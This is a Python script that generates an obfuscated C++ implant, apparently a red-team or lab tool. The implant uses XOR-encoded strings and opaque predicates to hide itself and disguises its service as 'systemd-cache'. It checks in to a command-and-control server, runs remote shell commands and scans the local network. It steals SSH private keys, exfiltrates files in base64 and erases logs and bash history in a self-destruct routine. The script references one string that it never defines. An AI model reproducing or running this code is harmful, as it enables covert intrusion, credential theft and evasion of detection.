#!/usr/bin/env python3
"""
Generates PersistentObfuscated.cpp from Persistent.cpp.
Applies XOR(0x5A) string obfuscation, renames all functions/variables,
adds dead code, and uses opaque predicates — matching the style of
BeachheadObfuscated.java.
"""

KEY = 0x5A

def xor_encode(s):
    """Return C++ initializer list for XOR-encoded string."""
    return "{" + ",".join(str(ord(c) ^ KEY) for c in s) + "}"

# Map of placeholder -> (original string, variable name)
# We collect every user-visible string from Persistent.cpp
S = {}
sid = 0
def S_(original):
    global sid
    name = f"_s{sid}"
    sid += 1
    S[name] = original
    return name

# Pre-register all strings
s_popen_mode     = S_("r")
s_c2_url         = S_("http://127.0.0.1:5000")
s_curl_post      = S_("curl -s -m 5 -X POST -H 'Content-Type: application/json' -d '")
s_curl_get       = S_("curl -s -m 5 '")
s_tick           = S_("'")
s_tick_sp        = S_("' '")
s_svc_binary     = S_("/usr/local/bin/systemd-cache-svc")
s_svc_unit       = S_("/etc/systemd/system/systemd-cache.service")
s_svc_name       = S_("systemd-cache.service")
s_ep_checkin     = S_("/checkin")
s_ep_command     = S_("/command")
s_ep_result      = S_("/result")
s_ep_exfil       = S_("/exfil")
s_hostname_cmd   = S_("hostname")
s_quote          = S_('"')
s_json_open      = S_('{"')
s_json_close     = S_('"}')
s_json_cq        = S_('":"')
s_json_comma     = S_('","')
s_host_key       = S_("host")
s_output_key     = S_("output")
s_command_key    = S_("command")
s_filename_key   = S_("filename")
s_data_key       = S_("data")
s_cmd_fc         = S_("full_chain")
s_cmd_ns         = S_("network_sweep")
s_cmd_ch         = S_("credential_harvest")
s_cmd_exfil      = S_("exfil ")
s_cmd_sd         = S_("self_destruct")
s_cmd_wait       = S_("wait")
s_cmd_none       = S_("none")
s_cmd_exit       = S_("exit")
s_cmd_quit       = S_("quit")
s_recon_cmd      = S_("echo '=== HOSTNAME ===' && hostname && echo '=== WHOAMI ===' && whoami && echo '=== ID ===' && id && echo '=== OS ===' && uname -a && echo '=== NETWORK ===' && (ip addr 2>/dev/null || ifconfig 2>/dev/null)")
s_ns_route       = S_("ip route show default 2>/dev/null")
s_ns_via         = S_("via ")
s_ns_fb          = S_("ip -4 addr show scope global 2>/dev/null | grep inet | head -1 | awk '{print $2}'")
s_ns_ping_pre    = S_("ping -c 1 -W 1 ")
s_ns_ping_post   = S_(" 2>/dev/null | grep -c '1 received'")
s_ns_probe_pre   = S_("(echo >/dev/tcp/")
s_ns_probe_post  = S_(") 2>/dev/null && echo open || echo closed")
s_open           = S_("open")
s_ch_ssh         = S_("find /root /home -maxdepth 3 -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null")
s_sd_stop        = S_("systemctl stop ")
s_sd_disable     = S_("systemctl disable ")
s_sd_rm          = S_("rm -f ")
s_sd_reload      = S_("systemctl daemon-reload 2>/dev/null")
s_sd_reset       = S_("systemctl reset-failed 2>/dev/null")
s_sd_jrot        = S_("journalctl --rotate 2>/dev/null")
s_sd_jvac        = S_("journalctl --vacuum-time=1s 2>/dev/null")
s_sd_sed_pre     = S_("sed -i '/")
s_sd_sed_auth    = S_("/d' /var/log/auth.log 2>/dev/null")
s_sd_sed_sys     = S_("/d' /var/log/syslog 2>/dev/null")
s_sd_cache       = S_("systemd-cache")
s_sd_rm_cache    = S_("rm -f /tmp/.systemd-cache 2>/dev/null")
s_sd_rm_persist  = S_("rm -f /tmp/.persist.sh 2>/dev/null")
s_sd_rm_stage    = S_("rm -rf /tmp/sudostage.* 2>/dev/null")
s_sd_hist1       = S_("sed -i '/systemd-cache/d' /root/.bash_history 2>/dev/null")
s_sd_hist2       = S_("sed -i '/Persistent/d' /root/.bash_history 2>/dev/null")
s_fc_ssh         = S_("find / -maxdepth 5 \\( -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' \\) 2>/dev/null")
s_redir          = S_(" 2>/dev/null")
s_dot            = S_(".")
s_slash          = S_("/")
s_one            = S_("1")

# Generate the string table
print("""#include <iostream>
#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <thread>
#include <atomic>
#include <chrono>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

using VI = std::vector<int>;

static std::string zz(const VI& c) {
    std::string o; for (int i : c) o += (char)(i ^ 0x5A); return o;
}

static void _dc0() { int x = 42; if (((x*x) < 0)) exit(0); }
""")

# Print all string constants
for name, val in S.items():
    print(f"static const VI {name} = {xor_encode(val)};")

# Now print the functional code using zz() calls instead of string literals
print(r"""
static const int _ps = 5; // poll interval

static std::string _a(const std::string& b) {
    std::array<char, 256> c{};
    std::string d;
    FILE* p = popen(b.c_str(), zz(_s0).c_str());
    if (!p) return "";
    while (fgets(c.data(), c.size(), p) != nullptr) d += c.data();
    pclose(p);
    if (!d.empty() && d.back() == '\n') d.pop_back();
    return d;
}

static std::string _e(const std::string& b, const std::string& k) {
    if (b.empty()) return "";
    std::string n = zz(_s14) + k + zz(_s14);
    size_t i = b.find(n); if (i == std::string::npos) return "";
    size_t c = b.find(':', i); if (c == std::string::npos) return "";
    size_t s = b.find('"', c); if (s == std::string::npos) return ""; ++s;
    size_t e = b.find('"', s); if (e == std::string::npos || e <= s) return "";
    return b.substr(s, e - s);
}

static std::string _f(const std::string& s) {
    std::string o;
    for (char c : s) {
        switch (c) {
            case '\\': o += "\\\\"; break;
            case '"': o += "\\\""; break;
            case '\n': o += "\\n"; break;
            case '\r': o += "\\r"; break;
            case '\t': o += "\\t"; break;
            default: o += c; break;
        }
    }
    return o;
}

static std::string _b64(const std::vector<uint8_t>& d) {
    static const char* t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string o; size_t l = d.size(); o.reserve(((l+2)/3)*4);
    for (size_t i = 0; i < l; i += 3) {
        uint32_t v = (uint32_t)d[i] << 16;
        if (i+1<l) v |= (uint32_t)d[i+1] << 8;
        if (i+2<l) v |= (uint32_t)d[i+2];
        o += t[(v>>18)&0x3F]; o += t[(v>>12)&0x3F];
        o += (i+1<l) ? t[(v>>6)&0x3F] : '=';
        o += (i+2<l) ? t[(v>>0)&0x3F] : '=';
    }
    return o;
}

static std::vector<uint8_t> _rf(const std::string& p) {
    std::ifstream f(p, std::ios::binary | std::ios::ate);
    if (!f.is_open()) return {};
    auto sz = f.tellg(); if (sz <= 0) return {};
    std::vector<uint8_t> b((size_t)sz);
    f.seekg(0); f.read(reinterpret_cast<char*>(b.data()), sz);
    return b;
}

static std::string _esc(const std::string& s) {
    std::string o;
    for (char c : s) {
        if (c == '\'') o += "'\\''";
        else o += c;
    }
    return o;
}

static std::string _g(const std::string& path, const std::string& json) {
    std::string cmd = zz(""" + s_curl_post + r""") + _esc(json) + zz(""" + s_tick_sp + r""") + zz(""" + s_c2_url + r""") + path + zz(""" + s_tick + r""");
    return _a(cmd);
}

static std::string _h(const std::string& path) {
    std::string cmd = zz(""" + s_curl_get + r""") + zz(""" + s_c2_url + r""") + path + zz(""" + s_tick + r""");
    return _a(cmd);
}

static void _sr(const std::string& o) {
    _g(zz(""" + s_ep_result + r"""), zz(""" + s_json_open + r""") + zz(""" + s_output_key + r""") + zz(""" + s_json_cq + r""") + _f(o) + zz(""" + s_json_close + r"""));
}

static std::string _t1() {
    std::string o;
    std::string ri = _a(zz(""" + s_ns_route + r"""));
    o += ri + "\n";
    std::string sn;
    size_t vp = ri.find(zz(""" + s_ns_via + r"""));
    if (vp != std::string::npos) {
        size_t is2 = vp + 4;
        size_t ie = ri.find(' ', is2);
        std::string gw = ri.substr(is2, ie - is2);
        size_t ld = gw.rfind('.'); if (ld != std::string::npos) sn = gw.substr(0, ld);
    }
    if (sn.empty()) {
        std::string ii = _a(zz(""" + s_ns_fb + r"""));
        size_t sl = ii.find('/'); if (sl != std::string::npos) ii = ii.substr(0, sl);
        size_t ld = ii.rfind('.'); if (ld != std::string::npos) sn = ii.substr(0, ld);
    }
    if (sn.empty()) return o;
    std::vector<std::string> lh;
    for (int i = 1; i <= 254; i++) {
        std::string h = sn + zz(""" + s_dot + r""") + std::to_string(i);
        std::string r = _a(zz(""" + s_ns_ping_pre + r""") + h + zz(""" + s_ns_ping_post + r"""));
        if (r.find(zz(""" + s_one + r""")) != std::string::npos) { o += h + "\n"; lh.push_back(h); }
    }
    int ports[] = {22,80,443,8080,3306,5432,6379,8443,25565};
    for (const auto& h : lh) {
        for (int p : ports) {
            std::string pr = _a(zz(""" + s_ns_probe_pre + r""") + h + zz(""" + s_slash + r""") + std::to_string(p) + zz(""" + s_ns_probe_post + r"""));
            if (pr.find(zz(""" + s_open + r""")) != std::string::npos) o += std::to_string(p) + " ";
        }
        o += "\n";
    }
    return o;
}

static std::string _t2() {
    std::string o;
    std::string sk = _a(zz(""" + s_ch_ssh + r"""));
    if (!sk.empty()) {
        o += sk + "\n";
        std::istringstream ss(sk); std::string kp;
        while (std::getline(ss, kp)) {
            if (kp.empty()) continue;
            std::vector<uint8_t> d = _rf(kp);
            if (!d.empty()) o += std::string(d.begin(), d.end()) + "\n";
        }
    }
    return o;
}

static std::string _t3(const std::string& fp) {
    std::string o;
    if (fp.empty()) return o;
    std::vector<uint8_t> d = _rf(fp);
    if (d.empty()) return o;
    std::string enc = _b64(d);
    std::string j = zz(""" + s_json_open + r""") + zz(""" + s_filename_key + r""") + zz(""" + s_json_cq + r""") + _f(fp) + zz(""" + s_json_comma + r""") + zz(""" + s_data_key + r""") + zz(""" + s_json_cq + r""") + enc + zz(""" + s_json_close + r""");
    _g(zz(""" + s_ep_exfil + r"""), j);
    o += std::to_string(d.size()) + " " + std::to_string(enc.size()) + "\n";
    return o;
}

std::atomic<bool> _st{true};

static std::string _t4() {
    std::string o;
    _a(zz(""" + s_sd_disable + r""") + zz(""" + s_svc_name + r""") + zz(""" + s_redir + r"""));
    _a(zz(""" + s_sd_rm + r""") + zz(""" + s_svc_unit + r"""));
    _a(zz(""" + s_sd_reload + r"""));
    _a(zz(""" + s_sd_reset + r"""));
    _a(zz(""" + s_sd_rm + r""") + zz(""" + s_svc_binary + r"""));
    _a(zz(""" + s_sd_jrot + r"""));
    _a(zz(""" + s_sd_jvac + r"""));
    _a(zz(""" + s_sd_sed_pre + r""") + zz(""" + s_svc_name + r""") + zz(""" + s_sd_sed_auth + r"""));
    _a(zz(""" + s_sd_sed_pre + r""") + zz(""" + s_svc_name + r""") + zz(""" + s_sd_sed_sys + r"""));
    _a(zz(""" + s_sd_sed_pre + r""") + zz(""" + s_sd_cache + r""") + zz(""" + s_sd_sed_auth + r"""));
    _a(zz(""" + s_sd_sed_pre + r""") + zz(""" + s_sd_cache + r""") + zz(""" + s_sd_sed_sys + r"""));
    _a(zz(""" + s_sd_rm_cache + r"""));
    _a(zz(""" + s_sd_rm_persist + r"""));
    _a(zz(""" + s_sd_rm_stage + r"""));
    _a(zz(""" + s_sd_hist1 + r"""));
    _a(zz(""" + s_sd_hist2 + r"""));
    _st = false;
    return o;
}

static std::string _t5() {
    std::string o;
    std::string rc = _a(zz(""" + s_recon_cmd + r"""));
    o += rc + "\n";
    o += _t1();
    o += _t2();
    std::string skp = _a(zz(""" + s_fc_ssh + r"""));
    if (!skp.empty()) {
        std::istringstream ss(skp); std::string kp;
        while (std::getline(ss, kp)) { if (!kp.empty()) o += _t3(kp); }
    }
    o += _t3(zz(""" + s_ch_shadow + r"""));
    return o;
}

static std::string _d(const std::string& cmd) {
    if (cmd == zz(""" + s_cmd_fc + r""")) return _t5();
    if (cmd == zz(""" + s_cmd_ns + r""")) return _t1();
    if (cmd == zz(""" + s_cmd_ch + r""")) return _t2();
    if (cmd.rfind(zz(""" + s_cmd_exfil + r"""), 0) == 0) {
        std::string fp = cmd.substr(6);
        while (!fp.empty() && fp.front() == ' ') fp.erase(0, 1);
        while (!fp.empty() && fp.back() == ' ') fp.pop_back();
        return _t3(fp);
    }
    if (cmd == zz(""" + s_cmd_sd + r""")) return _t4();
    return _a(cmd);
}

#ifndef TEST_BUILD

void _p() {
    int fl = 0;
    while (_st && fl < 50) {
        std::this_thread::sleep_for(std::chrono::seconds(_ps));
        try {
            std::string r = _h(zz(""" + s_ep_command + r"""));
            if (r.empty()) { fl++; continue; } fl = 0;
            std::string c = _e(r, zz(""" + s_command_key + r"""));
            if (c.empty() || c == zz(""" + s_cmd_wait + r""") || c == zz(""" + s_cmd_none + r""")) continue;
            if (c == zz(""" + s_cmd_exit + r""") || c == zz(""" + s_cmd_quit + r""")) { _st = false; break; }
            _sr(_d(c));
        } catch (...) { fl++; }
    }
}

int main() {
    _dc0();
    int op = 7;
    if (((op * op + op) % 2) == 0) {
        std::string h = _a(zz(""" + s_hostname_cmd + r"""));
        _g(zz(""" + s_ep_checkin + r"""), zz(""" + s_json_open + r""") + zz(""" + s_host_key + r""") + zz(""" + s_json_cq + r""") + _f(h) + zz(""" + s_json_close + r"""));
        std::string rc = _a(zz(""" + s_recon_cmd + r"""));
        _sr(rc);
        std::thread t(_p);
        t.join();
    }
    return 0;
}

#endif
""")
